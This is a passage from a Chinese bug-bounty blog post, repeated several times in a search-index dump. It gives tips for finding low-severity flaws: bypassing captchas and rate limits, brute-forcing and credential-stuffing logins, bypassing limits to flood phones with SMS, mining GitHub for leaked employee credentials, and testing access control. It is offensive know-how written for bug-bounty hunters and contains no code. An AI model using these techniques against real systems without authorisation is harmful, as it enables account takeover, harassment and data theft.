","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:2","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#绕过限制导致的爆破撞库用户遍历漏洞"},{"categories":["学习"],"content":" 捡中低危漏洞的一些技巧刚开始挖src往往不知道从哪下手，首先我们其实可以从各个src平台提交漏洞下拉框里看一看收取的漏洞类型。然后针对性的去学习如何挖掘，比如某src收取的漏洞类型,我们就可以针对性的学习对应的挖掘技巧。 框架注入 明文密码传输 表单破解漏洞 IIS短文件名泄露 老旧过期的HTTPS服务 跨目录下载漏洞 目录可浏览漏洞 LFI本地文件包含漏洞 RFI远程文件包含漏洞 HTTP拒绝服务攻击 弱口令登录 CSRF跨站点请求伪造 Flash点击劫持 SQL注入漏洞 XSS跨站脚本漏洞 文件上传漏洞 解析漏洞:IIS解析漏洞 解析漏洞:Apache解析漏洞 Cookies注入漏洞 越权访问漏洞 命令执行漏洞 Struts2远程代码执行漏洞 业务逻辑漏洞 用户隐私泄露 敏感信息泄漏(运维) 敏感信息泄漏(研发) 敏感文件泄漏(运维)(配置) 敏感文件泄漏(运维)(权限) 未验证的重定向和传递 Flash跨域访问资源 测试文件泄漏 开启危险的HTTP方法 HTTP参数污染 Unicode编码绕过 源码泄漏 后台目录泄漏 链接注入漏洞 SSRF服务器请求伪造 jsonp劫持 学习完基础的漏洞类型后，我们可以多看一些实战的漏洞报告。比如wooyun漏洞库和hackone上的报告。 乌云漏洞库:https://wooyun.x10sec.org/ hackone报告：https://pan.baidu.com/s/1jPUSuoERSIDw2zCKZ0xTjA 提取码:2klt 这里列举一些我经常挖到的垃圾洞，生而为人，挖不到大洞，我很抱歉┭┮﹏┭┮。 登录框处常见的一些漏洞在我们通过对目标的前期信息收集之后，首当其冲的往往就是各种奇奇怪怪的登录框，一般来说，大型的企业为了减少安全问题，一般都是用统一的登录接口登录不同的旗下网站，但是一些后台系统，运维系统，或者一些边缘业务使用了独立的注册、登录体系，这个时候往往就会存在安全问题。 现在还能用的接码平台: http://www.114sim.com/ https://yunduanxin.net/China-Phone-Number/ https://www.materialtools.com/ 绕过限制导致的爆破、撞库、用户遍历漏洞最常见的一种漏洞，尤其是一些老旧的后台系统，可能验证码抓个包就绕过去了。下面是一些常见的绕过姿势: 验证码不刷新 验证码抓包绕过 验证码删除绕过 验证码置空绕过 修改xff头绕过:推荐个burp插件,https://github.com/TheKingOfDuck/burpFakeIP 账号后加空格绕过账号错误次数限制。 一般来说如果只是简单的验证码绕过，一般都是低危，所以一般能够绕过验证码的情况，都要尝试爆破一波账号密码。 弱口令漏洞没有验证码或者验证码可以绕过的情况 直接上一手字典爆破，当然还是有一些小技巧: 比如可以设置固定的弱密码，比如123456，然后爆破账号。 比如可以首先收集一些网站的信息针对性的制作字典，比如域名，员工邮箱，企业名称等等,推荐工具:白鹿社工字典生成:https://github.com/HongLuDianXue/BaiLu-SED-Tool 爆破的关键在于字典，常见的字典github上都有,但是普通的弱口令现在确实不太好用了，要想提高成功的机率，还是需要碰一碰强密码，分享先知的文章: https://xz.aliyun.com/t/7823 https://github.com/huyuanzhi2/password_brute_dictionary 有验证码且无法绕过的情况 github直接找员工账号邮箱，密码。 源码或者js文件查找线索，邮箱，或者加密的账号密码。 特定系统或者cms，搜索引擎搜索默认管理员或者测试密码。 手动尝试常见弱口令。 注册、登录、找回密码处的短信\\邮箱轰炸漏洞这个也挺常见的，一般可以对特定用户进行轰炸的是一定会收的，横向轰炸能够消耗资源的随缘收。常见的绕过姿势: 加空格绕过 加任意字母绕过 前面加86绕过 xff头伪造ip绕过 逻辑缺陷的导致的任意用户注册、登录、找回密码漏洞因为这方面漏洞一旦出现基本都是高危，所以挖掘的时候 类似的思路我就不细说了,freebuf上有任意用户密码重置的系列文章,类似漏洞思路其实相差不大: https://www.freebuf.com/author/yangyangwithgnu 常见的信息泄露漏洞敏感信息泄露的范围很广，我认为一般就是两大类， 因为配置错误或者管理不当导致的企业内部信息泄露。 因为逻辑缺陷导致的用户资料泄露(遍历)。 github导致的信息泄露 P牛知识星球里分享的github搜索关键词:https://twitter.com/obheda12/status/1316513838716551169 github子域名监控项目:https://github.com/FeeiCN/GSIL 常见的泄露内容: 员工内部邮箱、登录账号、密码。 企业的一些内部系统域名、ip泄露。 企业网站的工程代码、网站源码泄露，可以通过员工邮箱关键词查找，要注意日期，好几年的大概率不收了。 乌云上有一些案例，可以看一看。 配置错误导致的信息泄露包含的类型很多，最重要的是有一份足够强大的字典和一个好用的扫描器。 我在实际进行探测的时候，对于大批量的域名来说，更喜欢先用一份精简的小字典先进行快速扫描 比如: 备份文件的小字典 springboot泄露的小字典 网站后台的小字典 比较出名的扫描器我们常见的dirsearch、dirmap，dirbuster等等。 可视化的比如TEST404系列、御剑扫描器使用体验也不错。 注:信息泄露中比较常见的swagger-ui服务泄露，可能直接提交会忽略或者低危，别忘了进一步测试泄露的接口功能。 越权导致的信息泄露很多时候越权来来去去都是更改一个参数的问题,更多的时候还是要细心的一个一个测业务功能，注意观察和测试操作参数和对象参数，操作参数一般是增删改查对应特定业务的敏感操作、对象参数一般是用户或者物品等。 推荐几个burp插件: 未授权检测： https://github.com/theLSA/burp-unauth-checker 敏感参数提取：https://github.com/theLSA/burp-sensitive-param-extractor 信息提取：https://github.com/theLSA/burp-info-extractor 插件的作用基本还是帮助我们快速定位敏感参数，实际测试还是需要我们一个包一个包仔细的分析程序逻辑。 常见的一些越权情况: 基于用户ID的越权 基于功能对象ID的越权 基于上传对象ID的越权 基于未授权访问的越权 基于功能地址的越权 基于接口身份的越权 ","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:2","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#弱口令漏洞"},{"categories":["学习"],"content":" 捡中低危漏洞的一些技巧刚开始挖src往往不知道从哪下手，首先我们其实可以从各个src平台提交漏洞下拉框里看一看收取的漏洞类型。然后针对性的去学习如何挖掘，比如某src收取的漏洞类型,我们就可以针对性的学习对应的挖掘技巧。 框架注入 明文密码传输 表单破解漏洞 IIS短文件名泄露 老旧过期的HTTPS服务 跨目录下载漏洞 目录可浏览漏洞 LFI本地文件包含漏洞 RFI远程文件包含漏洞 HTTP拒绝服务攻击 弱口令登录 CSRF跨站点请求伪造 Flash点击劫持 SQL注入漏洞 XSS跨站脚本漏洞 文件上传漏洞 解析漏洞:IIS解析漏洞 解析漏洞:Apache解析漏洞 Cookies注入漏洞 越权访问漏洞 命令执行漏洞 Struts2远程代码执行漏洞 业务逻辑漏洞 用户隐私泄露 敏感信息泄漏(运维) 敏感信息泄漏(研发) 敏感文件泄漏(运维)(配置) 敏感文件泄漏(运维)(权限) 未验证的重定向和传递 Flash跨域访问资源 测试文件泄漏 开启危险的HTTP方法 HTTP参数污染 Unicode编码绕过 源码泄漏 后台目录泄漏 链接注入漏洞 SSRF服务器请求伪造 jsonp劫持 学习完基础的漏洞类型后，我们可以多看一些实战的漏洞报告。比如wooyun漏洞库和hackone上的报告。 乌云漏洞库:https://wooyun.x10sec.org/ hackone报告：https://pan.baidu.com/s/1jPUSuoERSIDw2zCKZ0xTjA 提取码:2klt 这里列举一些我经常挖到的垃圾洞，生而为人，挖不到大洞，我很抱歉┭┮﹏┭┮。 登录框处常见的一些漏洞在我们通过对目标的前期信息收集之后，首当其冲的往往就是各种奇奇怪怪的登录框，一般来说，大型的企业为了减少安全问题，一般都是用统一的登录接口登录不同的旗下网站，但是一些后台系统，运维系统，或者一些边缘业务使用了独立的注册、登录体系，这个时候往往就会存在安全问题。 现在还能用的接码平台: http://www.114sim.com/ https://yunduanxin.net/China-Phone-Number/ https://www.materialtools.com/ 绕过限制导致的爆破、撞库、用户遍历漏洞最常见的一种漏洞，尤其是一些老旧的后台系统，可能验证码抓个包就绕过去了。下面是一些常见的绕过姿势: 验证码不刷新 验证码抓包绕过 验证码删除绕过 验证码置空绕过 修改xff头绕过:推荐个burp插件,https://github.com/TheKingOfDuck/burpFakeIP 账号后加空格绕过账号错误次数限制。 一般来说如果只是简单的验证码绕过，一般都是低危，所以一般能够绕过验证码的情况，都要尝试爆破一波账号密码。 弱口令漏洞没有验证码或者验证码可以绕过的情况 直接上一手字典爆破，当然还是有一些小技巧: 比如可以设置固定的弱密码，比如123456，然后爆破账号。 比如可以首先收集一些网站的信息针对性的制作字典，比如域名，员工邮箱，企业名称等等,推荐工具:白鹿社工字典生成:https://github.com/HongLuDianXue/BaiLu-SED-Tool 爆破的关键在于字典，常见的字典github上都有,但是普通的弱口令现在确实不太好用了，要想提高成功的机率，还是需要碰一碰强密码，分享先知的文章: https://xz.aliyun.com/t/7823 https://github.com/huyuanzhi2/password_brute_dictionary 有验证码且无法绕过的情况 github直接找员工账号邮箱，密码。 源码或者js文件查找线索，邮箱，或者加密的账号密码。 特定系统或者cms，搜索引擎搜索默认管理员或者测试密码。 手动尝试常见弱口令。 注册、登录、找回密码处的短信\\邮箱轰炸漏洞这个也挺常见的，一般可以对特定用户进行轰炸的是一定会收的，横向轰炸能够消耗资源的随缘收。常见的绕过姿势: 加空格绕过 加任意字母绕过 前面加86绕过 xff头伪造ip绕过 逻辑缺陷的导致的任意用户注册、登录、找回密码漏洞因为这方面漏洞一旦出现基本都是高危，所以挖掘的时候 类似的思路我就不细说了,freebuf上有任意用户密码重置的系列文章,类似漏洞思路其实相差不大: https://www.freebuf.com/author/yangyangwithgnu 常见的信息泄露漏洞敏感信息泄露的范围很广，我认为一般就是两大类， 因为配置错误或者管理不当导致的企业内部信息泄露。 因为逻辑缺陷导致的用户资料泄露(遍历)。 github导致的信息泄露 P牛知识星球里分享的github搜索关键词:https://twitter.com/obheda12/status/1316513838716551169 github子域名监控项目:https://github.com/FeeiCN/GSIL 常见的泄露内容: 员工内部邮箱、登录账号、密码。 企业的一些内部系统域名、ip泄露。 企业网站的工程代码、网站源码泄露，可以通过员工邮箱关键词查找，要注意日期，好几年的大概率不收了。 乌云上有一些案例，可以看一看。 配置错误导致的信息泄露包含的类型很多，最重要的是有一份足够强大的字典和一个好用的扫描器。 我在实际进行探测的时候，对于大批量的域名来说，更喜欢先用一份精简的小字典先进行快速扫描 比如: 备份文件的小字典 springboot泄露的小字典 网站后台的小字典 比较出名的扫描器我们常见的dirsearch、dirmap，dirbuster等等。 可视化的比如TEST404系列、御剑扫描器使用体验也不错。 注:信息泄露中比较常见的swagger-ui服务泄露，可能直接提交会忽略或者低危，别忘了进一步测试泄露的接口功能。 越权导致的信息泄露很多时候越权来来去去都是更改一个参数的问题,更多的时候还是要细心的一个一个测业务功能，注意观察和测试操作参数和对象参数，操作参数一般是增删改查对应特定业务的敏感操作、对象参数一般是用户或者物品等。 推荐几个burp插件: 未授权检测： https://github.com/theLSA/burp-unauth-checker 敏感参数提取：https://github.com/theLSA/burp-sensitive-param-extractor 信息提取：https://github.com/theLSA/burp-info-extractor 插件的作用基本还是帮助我们快速定位敏感参数，实际测试还是需要我们一个包一个包仔细的分析程序逻辑。 常见的一些越权情况: 基于用户ID的越权 基于功能对象ID的越权 基于上传对象ID的越权 基于未授权访问的越权 基于功能地址的越权 基于接口身份的越权 ","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:2","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#注册登录找回密码处的短信邮箱轰炸漏洞"},{"categories":["学习"],"content":" 捡中低危漏洞的一些技巧刚开始挖src往往不知道从哪下手，首先我们其实可以从各个src平台提交漏洞下拉框里看一看收取的漏洞类型。然后针对性的去学习如何挖掘，比如某src收取的漏洞类型,我们就可以针对性的学习对应的挖掘技巧。 框架注入 明文密码传输 表单破解漏洞 IIS短文件名泄露 老旧过期的HTTPS服务 跨目录下载漏洞 目录可浏览漏洞 LFI本地文件包含漏洞 RFI远程文件包含漏洞 HTTP拒绝服务攻击 弱口令登录 CSRF跨站点请求伪造 Flash点击劫持 SQL注入漏洞 XSS跨站脚本漏洞 文件上传漏洞 解析漏洞:IIS解析漏洞 解析漏洞:Apache解析漏洞 Cookies注入漏洞 越权访问漏洞 命令执行漏洞 Struts2远程代码执行漏洞 业务逻辑漏洞 用户隐私泄露 敏感信息泄漏(运维) 敏感信息泄漏(研发) 敏感文件泄漏(运维)(配置) 敏感文件泄漏(运维)(权限) 未验证的重定向和传递 Flash跨域访问资源 测试文件泄漏 开启危险的HTTP方法 HTTP参数污染 Unicode编码绕过 源码泄漏 后台目录泄漏 链接注入漏洞 SSRF服务器请求伪造 jsonp劫持 学习完基础的漏洞类型后，我们可以多看一些实战的漏洞报告。比如wooyun漏洞库和hackone上的报告。 乌云漏洞库:https://wooyun.x10sec.org/ hackone报告：https://pan.baidu.com/s/1jPUSuoERSIDw2zCKZ0xTjA 提取码:2klt 这里列举一些我经常挖到的垃圾洞，生而为人，挖不到大洞，我很抱歉┭┮﹏┭┮。 登录框处常见的一些漏洞在我们通过对目标的前期信息收集之后，首当其冲的往往就是各种奇奇怪怪的登录框，一般来说，大型的企业为了减少安全问题，一般都是用统一的登录接口登录不同的旗下网站，但是一些后台系统，运维系统，或者一些边缘业务使用了独立的注册、登录体系，这个时候往往就会存在安全问题。 现在还能用的接码平台: http://www.114sim.com/ https://yunduanxin.net/China-Phone-Number/ https://www.materialtools.com/ 绕过限制导致的爆破、撞库、用户遍历漏洞最常见的一种漏洞，尤其是一些老旧的后台系统，可能验证码抓个包就绕过去了。下面是一些常见的绕过姿势: 验证码不刷新 验证码抓包绕过 验证码删除绕过 验证码置空绕过 修改xff头绕过:推荐个burp插件,https://github.com/TheKingOfDuck/burpFakeIP 账号后加空格绕过账号错误次数限制。 一般来说如果只是简单的验证码绕过，一般都是低危，所以一般能够绕过验证码的情况，都要尝试爆破一波账号密码。 弱口令漏洞没有验证码或者验证码可以绕过的情况 直接上一手字典爆破，当然还是有一些小技巧: 比如可以设置固定的弱密码，比如123456，然后爆破账号。 比如可以首先收集一些网站的信息针对性的制作字典，比如域名，员工邮箱，企业名称等等,推荐工具:白鹿社工字典生成:https://github.com/HongLuDianXue/BaiLu-SED-Tool 爆破的关键在于字典，常见的字典github上都有,但是普通的弱口令现在确实不太好用了，要想提高成功的机率，还是需要碰一碰强密码，分享先知的文章: https://xz.aliyun.com/t/7823 https://github.com/huyuanzhi2/password_brute_dictionary 有验证码且无法绕过的情况 github直接找员工账号邮箱，密码。 源码或者js文件查找线索，邮箱，或者加密的账号密码。 特定系统或者cms，搜索引擎搜索默认管理员或者测试密码。 手动尝试常见弱口令。 注册、登录、找回密码处的短信\\邮箱轰炸漏洞这个也挺常见的，一般可以对特定用户进行轰炸的是一定会收的，横向轰炸能够消耗资源的随缘收。常见的绕过姿势: 加空格绕过 加任意字母绕过 前面加86绕过 xff头伪造ip绕过 逻辑缺陷的导致的任意用户注册、登录、找回密码漏洞因为这方面漏洞一旦出现基本都是高危，所以挖掘的时候 类似的思路我就不细说了,freebuf上有任意用户密码重置的系列文章,类似漏洞思路其实相差不大: https://www.freebuf.com/author/yangyangwithgnu 常见的信息泄露漏洞敏感信息泄露的范围很广，我认为一般就是两大类， 因为配置错误或者管理不当导致的企业内部信息泄露。 因为逻辑缺陷导致的用户资料泄露(遍历)。 github导致的信息泄露 P牛知识星球里分享的github搜索关键词:https://twitter.com/obheda12/status/1316513838716551169 github子域名监控项目:https://github.com/FeeiCN/GSIL 常见的泄露内容: 员工内部邮箱、登录账号、密码。 企业的一些内部系统域名、ip泄露。 企业网站的工程代码、网站源码泄露，可以通过员工邮箱关键词查找，要注意日期，好几年的大概率不收了。 乌云上有一些案例，可以看一看。 配置错误导致的信息泄露包含的类型很多，最重要的是有一份足够强大的字典和一个好用的扫描器。 我在实际进行探测的时候，对于大批量的域名来说，更喜欢先用一份精简的小字典先进行快速扫描 比如: 备份文件的小字典 springboot泄露的小字典 网站后台的小字典 比较出名的扫描器我们常见的dirsearch、dirmap，dirbuster等等。 可视化的比如TEST404系列、御剑扫描器使用体验也不错。 注:信息泄露中比较常见的swagger-ui服务泄露，可能直接提交会忽略或者低危，别忘了进一步测试泄露的接口功能。 越权导致的信息泄露很多时候越权来来去去都是更改一个参数的问题,更多的时候还是要细心的一个一个测业务功能，注意观察和测试操作参数和对象参数，操作参数一般是增删改查对应特定业务的敏感操作、对象参数一般是用户或者物品等。 推荐几个burp插件: 未授权检测： https://github.com/theLSA/burp-unauth-checker 敏感参数提取：https://github.com/theLSA/burp-sensitive-param-extractor 信息提取：https://github.com/theLSA/burp-info-extractor 插件的作用基本还是帮助我们快速定位敏感参数，实际测试还是需要我们一个包一个包仔细的分析程序逻辑。 常见的一些越权情况: 基于用户ID的越权 基于功能对象ID的越权 基于上传对象ID的越权 基于未授权访问的越权 基于功能地址的越权 基于接口身份的越权 ","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:2","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#逻辑缺陷的导致的任意用户注册登录找回密码漏洞"},{"categories":["学习"],"content":" 捡中低危漏洞的一些技巧刚开始挖src往往不知道从哪下手，首先我们其实可以从各个src平台提交漏洞下拉框里看一看收取的漏洞类型。然后针对性的去学习如何挖掘，比如某src收取的漏洞类型,我们就可以针对性的学习对应的挖掘技巧。 框架注入 明文密码传输 表单破解漏洞 IIS短文件名泄露 老旧过期的HTTPS服务 跨目录下载漏洞 目录可浏览漏洞 LFI本地文件包含漏洞 RFI远程文件包含漏洞 HTTP拒绝服务攻击 弱口令登录 CSRF跨站点请求伪造 Flash点击劫持 SQL注入漏洞 XSS跨站脚本漏洞 文件上传漏洞 解析漏洞:IIS解析漏洞 解析漏洞:Apache解析漏洞 Cookies注入漏洞 越权访问漏洞 命令执行漏洞 Struts2远程代码执行漏洞 业务逻辑漏洞 用户隐私泄露 敏感信息泄漏(运维) 敏感信息泄漏(研发) 敏感文件泄漏(运维)(配置) 敏感文件泄漏(运维)(权限) 未验证的重定向和传递 Flash跨域访问资源 测试文件泄漏 开启危险的HTTP方法 HTTP参数污染 Unicode编码绕过 源码泄漏 后台目录泄漏 链接注入漏洞 SSRF服务器请求伪造 jsonp劫持 学习完基础的漏洞类型后，我们可以多看一些实战的漏洞报告。比如wooyun漏洞库和hackone上的报告。 乌云漏洞库:https://wooyun.x10sec.org/ hackone报告：https://pan.baidu.com/s/1jPUSuoERSIDw2zCKZ0xTjA 提取码:2klt 这里列举一些我经常挖到的垃圾洞，生而为人，挖不到大洞，我很抱歉┭┮﹏┭┮。 登录框处常见的一些漏洞在我们通过对目标的前期信息收集之后，首当其冲的往往就是各种奇奇怪怪的登录框，一般来说，大型的企业为了减少安全问题，一般都是用统一的登录接口登录不同的旗下网站，但是一些后台系统，运维系统，或者一些边缘业务使用了独立的注册、登录体系，这个时候往往就会存在安全问题。 现在还能用的接码平台: http://www.114sim.com/ https://yunduanxin.net/China-Phone-Number/ https://www.materialtools.com/ 绕过限制导致的爆破、撞库、用户遍历漏洞最常见的一种漏洞，尤其是一些老旧的后台系统，可能验证码抓个包就绕过去了。下面是一些常见的绕过姿势: 验证码不刷新 验证码抓包绕过 验证码删除绕过 验证码置空绕过 修改xff头绕过:推荐个burp插件,https://github.com/TheKingOfDuck/burpFakeIP 账号后加空格绕过账号错误次数限制。 一般来说如果只是简单的验证码绕过，一般都是低危，所以一般能够绕过验证码的情况，都要尝试爆破一波账号密码。 弱口令漏洞没有验证码或者验证码可以绕过的情况 直接上一手字典爆破，当然还是有一些小技巧: 比如可以设置固定的弱密码，比如123456，然后爆破账号。 比如可以首先收集一些网站的信息针对性的制作字典，比如域名，员工邮箱，企业名称等等,推荐工具:白鹿社工字典生成:https://github.com/HongLuDianXue/BaiLu-SED-Tool 爆破的关键在于字典，常见的字典github上都有,但是普通的弱口令现在确实不太好用了，要想提高成功的机率，还是需要碰一碰强密码，分享先知的文章: https://xz.aliyun.com/t/7823 https://github.com/huyuanzhi2/password_brute_dictionary 有验证码且无法绕过的情况 github直接找员工账号邮箱，密码。 源码或者js文件查找线索，邮箱，或者加密的账号密码。 特定系统或者cms，搜索引擎搜索默认管理员或者测试密码。 手动尝试常见弱口令。 注册、登录、找回密码处的短信\\邮箱轰炸漏洞这个也挺常见的，一般可以对特定用户进行轰炸的是一定会收的，横向轰炸能够消耗资源的随缘收。常见的绕过姿势: 加空格绕过 加任意字母绕过 前面加86绕过 xff头伪造ip绕过 逻辑缺陷的导致的任意用户注册、登录、找回密码漏洞因为这方面漏洞一旦出现基本都是高危，所以挖掘的时候 类似的思路我就不细说了,freebuf上有任意用户密码重置的系列文章,类似漏洞思路其实相差不大: https://www.freebuf.com/author/yangyangwithgnu 常见的信息泄露漏洞敏感信息泄露的范围很广，我认为一般就是两大类， 因为配置错误或者管理不当导致的企业内部信息泄露。 因为逻辑缺陷导致的用户资料泄露(遍历)。 github导致的信息泄露 P牛知识星球里分享的github搜索关键词:https://twitter.com/obheda12/status/1316513838716551169 github子域名监控项目:https://github.com/FeeiCN/GSIL 常见的泄露内容: 员工内部邮箱、登录账号、密码。 企业的一些内部系统域名、ip泄露。 企业网站的工程代码、网站源码泄露，可以通过员工邮箱关键词查找，要注意日期，好几年的大概率不收了。 乌云上有一些案例，可以看一看。 配置错误导致的信息泄露包含的类型很多，最重要的是有一份足够强大的字典和一个好用的扫描器。 我在实际进行探测的时候，对于大批量的域名来说，更喜欢先用一份精简的小字典先进行快速扫描 比如: 备份文件的小字典 springboot泄露的小字典 网站后台的小字典 比较出名的扫描器我们常见的dirsearch、dirmap，dirbuster等等。 可视化的比如TEST404系列、御剑扫描器使用体验也不错。 注:信息泄露中比较常见的swagger-ui服务泄露，可能直接提交会忽略或者低危，别忘了进一步测试泄露的接口功能。 越权导致的信息泄露很多时候越权来来去去都是更改一个参数的问题,更多的时候还是要细心的一个一个测业务功能，注意观察和测试操作参数和对象参数，操作参数一般是增删改查对应特定业务的敏感操作、对象参数一般是用户或者物品等。 推荐几个burp插件: 未授权检测： https://github.com/theLSA/burp-unauth-checker 敏感参数提取：https://github.com/theLSA/burp-sensitive-param-extractor 信息提取：https://github.com/theLSA/burp-info-extractor 插件的作用基本还是帮助我们快速定位敏感参数，实际测试还是需要我们一个包一个包仔细的分析程序逻辑。 常见的一些越权情况: 基于用户ID的越权 基于功能对象ID的越权 基于上传对象ID的越权 基于未授权访问的越权 基于功能地址的越权 基于接口身份的越权 ","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:2","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#常见的信息泄露漏洞"},{"categories":["学习"],"content":" 捡中低危漏洞的一些技巧刚开始挖src往往不知道从哪下手，首先我们其实可以从各个src平台提交漏洞下拉框里看一看收取的漏洞类型。然后针对性的去学习如何挖掘，比如某src收取的漏洞类型,我们就可以针对性的学习对应的挖掘技巧。 框架注入 明文密码传输 表单破解漏洞 IIS短文件名泄露 老旧过期的HTTPS服务 跨目录下载漏洞 目录可浏览漏洞 LFI本地文件包含漏洞 RFI远程文件包含漏洞 HTTP拒绝服务攻击 弱口令登录 CSRF跨站点请求伪造 Flash点击劫持 SQL注入漏洞 XSS跨站脚本漏洞 文件上传漏洞 解析漏洞:IIS解析漏洞 解析漏洞:Apache解析漏洞 Cookies注入漏洞 越权访问漏洞 命令执行漏洞 Struts2远程代码执行漏洞 业务逻辑漏洞 用户隐私泄露 敏感信息泄漏(运维) 敏感信息泄漏(研发) 敏感文件泄漏(运维)(配置) 敏感文件泄漏(运维)(权限) 未验证的重定向和传递 Flash跨域访问资源 测试文件泄漏 开启危险的HTTP方法 HTTP参数污染 Unicode编码绕过 源码泄漏 后台目录泄漏 链接注入漏洞 SSRF服务器请求伪造 jsonp劫持 学习完基础的漏洞类型后，我们可以多看一些实战的漏洞报告。比如wooyun漏洞库和hackone上的报告。 乌云漏洞库:https://wooyun.x10sec.org/ hackone报告：https://pan.baidu.com/s/1jPUSuoERSIDw2zCKZ0xTjA 提取码:2klt 这里列举一些我经常挖到的垃圾洞，生而为人，挖不到大洞，我很抱歉┭┮﹏┭┮。 登录框处常见的一些漏洞在我们通过对目标的前期信息收集之后，首当其冲的往往就是各种奇奇怪怪的登录框，一般来说，大型的企业为了减少安全问题，一般都是用统一的登录接口登录不同的旗下网站，但是一些后台系统，运维系统，或者一些边缘业务使用了独立的注册、登录体系，这个时候往往就会存在安全问题。 现在还能用的接码平台: http://www.114sim.com/ https://yunduanxin.net/China-Phone-Number/ https://www.materialtools.com/ 绕过限制导致的爆破、撞库、用户遍历漏洞最常见的一种漏洞，尤其是一些老旧的后台系统，可能验证码抓个包就绕过去了。下面是一些常见的绕过姿势: 验证码不刷新 验证码抓包绕过 验证码删除绕过 验证码置空绕过 修改xff头绕过:推荐个burp插件,https://github.com/TheKingOfDuck/burpFakeIP 账号后加空格绕过账号错误次数限制。 一般来说如果只是简单的验证码绕过，一般都是低危，所以一般能够绕过验证码的情况，都要尝试爆破一波账号密码。 弱口令漏洞没有验证码或者验证码可以绕过的情况 直接上一手字典爆破，当然还是有一些小技巧: 比如可以设置固定的弱密码，比如123456，然后爆破账号。 比如可以首先收集一些网站的信息针对性的制作字典，比如域名，员工邮箱，企业名称等等,推荐工具:白鹿社工字典生成:https://github.com/HongLuDianXue/BaiLu-SED-Tool 爆破的关键在于字典，常见的字典github上都有,但是普通的弱口令现在确实不太好用了，要想提高成功的机率，还是需要碰一碰强密码，分享先知的文章: https://xz.aliyun.com/t/7823 https://github.com/huyuanzhi2/password_brute_dictionary 有验证码且无法绕过的情况 github直接找员工账号邮箱，密码。 源码或者js文件查找线索，邮箱，或者加密的账号密码。 特定系统或者cms，搜索引擎搜索默认管理员或者测试密码。 手动尝试常见弱口令。 注册、登录、找回密码处的短信\\邮箱轰炸漏洞这个也挺常见的，一般可以对特定用户进行轰炸的是一定会收的，横向轰炸能够消耗资源的随缘收。常见的绕过姿势: 加空格绕过 加任意字母绕过 前面加86绕过 xff头伪造ip绕过 逻辑缺陷的导致的任意用户注册、登录、找回密码漏洞因为这方面漏洞一旦出现基本都是高危，所以挖掘的时候 类似的思路我就不细说了,freebuf上有任意用户密码重置的系列文章,类似漏洞思路其实相差不大: https://www.freebuf.com/author/yangyangwithgnu 常见的信息泄露漏洞敏感信息泄露的范围很广，我认为一般就是两大类， 因为配置错误或者管理不当导致的企业内部信息泄露。 因为逻辑缺陷导致的用户资料泄露(遍历)。 github导致的信息泄露 P牛知识星球里分享的github搜索关键词:https://twitter.com/obheda12/status/1316513838716551169 github子域名监控项目:https://github.com/FeeiCN/GSIL 常见的泄露内容: 员工内部邮箱、登录账号、密码。 企业的一些内部系统域名、ip泄露。 企业网站的工程代码、网站源码泄露，可以通过员工邮箱关键词查找，要注意日期，好几年的大概率不收了。 乌云上有一些案例，可以看一看。 配置错误导致的信息泄露包含的类型很多，最重要的是有一份足够强大的字典和一个好用的扫描器。 我在实际进行探测的时候，对于大批量的域名来说，更喜欢先用一份精简的小字典先进行快速扫描 比如: 备份文件的小字典 springboot泄露的小字典 网站后台的小字典 比较出名的扫描器我们常见的dirsearch、dirmap，dirbuster等等。 可视化的比如TEST404系列、御剑扫描器使用体验也不错。 注:信息泄露中比较常见的swagger-ui服务泄露，可能直接提交会忽略或者低危，别忘了进一步测试泄露的接口功能。 越权导致的信息泄露很多时候越权来来去去都是更改一个参数的问题,更多的时候还是要细心的一个一个测业务功能，注意观察和测试操作参数和对象参数，操作参数一般是增删改查对应特定业务的敏感操作、对象参数一般是用户或者物品等。 推荐几个burp插件: 未授权检测： https://github.com/theLSA/burp-unauth-checker 敏感参数提取：https://github.com/theLSA/burp-sensitive-param-extractor 信息提取：https://github.com/theLSA/burp-info-extractor 插件的作用基本还是帮助我们快速定位敏感参数，实际测试还是需要我们一个包一个包仔细的分析程序逻辑。 常见的一些越权情况: 基于用户ID的越权 基于功能对象ID的越权 基于上传对象ID的越权 基于未授权访问的越权 基于功能地址的越权 基于接口身份的越权 